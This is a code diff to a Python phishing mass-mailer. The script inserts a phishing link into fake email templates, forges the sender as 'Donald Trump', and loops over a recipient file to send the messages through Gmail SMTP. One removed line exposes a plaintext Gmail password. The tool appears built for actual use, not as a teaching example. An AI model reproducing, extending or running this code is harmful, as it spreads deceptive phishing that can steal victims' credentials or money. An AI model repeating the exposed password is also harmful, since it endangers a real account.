@@ -11,15 +11,15 @@ class HandleMail:
         self.readLink()
         seed(1)
     def readMail(self):
-        with open('../fake_mail.json') as f:
+        with open('./fake_mail.json') as f:
             data = json.load(f)
             for tex in data['fake_mail']:
                 self.fake_mail_text.append(tex['text'])
     def getText(self):
         v = randint(0, len(self.fake_mail_text) - 1)
-        return self.fake_mail_text[v]
+        return self.fake_mail_text[v].replace('{phishing_link}', self.link)
     def readLink(self):
-        with open('../link.txt') as f:
+        with open('./link.txt') as f:
             self.link = f.read()
 
 
@@ -36,34 +36,19 @@ class Mail:
             smtp.ehlo()
             smtp.starttls()
             smtp.ehlo()
-            smtp.login('sonrfid@gmail.com', 'Labu123.Kr')
+            smtp.login('sonrfid@gmail.com', '')
             message = f"From: {self.fake_name} <{self.fake_from}>\nTo: {self.to_name} <{self.to_email}>\nSubject: {self.subject}\n\n{self.content}"
-            smtp.sendmail('sonrfid@gmail.com', 'keszinaj@gmail.com', message.encode())
+            smtp.sendmail('sonrfid@gmail.com', self.to_email, message.encode())
 
 if __name__ == "__main__":
     set_server = HandleMail()
     text = set_server.getText()
     fake_from = "donaldtrump@gmail.com"
     fake_name = "Donald Trump"
-    subject = "ASAP"
-    mail_test = Mail('keszinaj@gmail.com', fake_from, fake_name, subject, text)
-    mail_test.sendMail()
+    subject = "ASAPv"
+    with open('./send_to.txt') as my_file:
+        for mail in my_file:
+            mail_test = Mail(mail, fake_from, fake_name, subject, text)
+            mail_test.sendMail()
     print('sent')
 
-''' 
-fake_from = "donaldtrump@gmail.com"
-fake_name = "Donald Trump"
-subject = "ASAP"
-content = fake_mail_text[1].replace('{phishing_link}', phishing_link)
-to_name = ''
-to_email = ''
-with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
-    smtp.ehlo()
-    smtp.starttls()
-    smtp.ehlo()
-
-    smtp.login('', '')
-
-    message = f"From: {fake_name} <{fake_from}>\nTo: {to_name} <{to_email}>\nSubject: {subject}\n\n{content}"
-    smtp.sendmail('', '', message.encode())
-'''
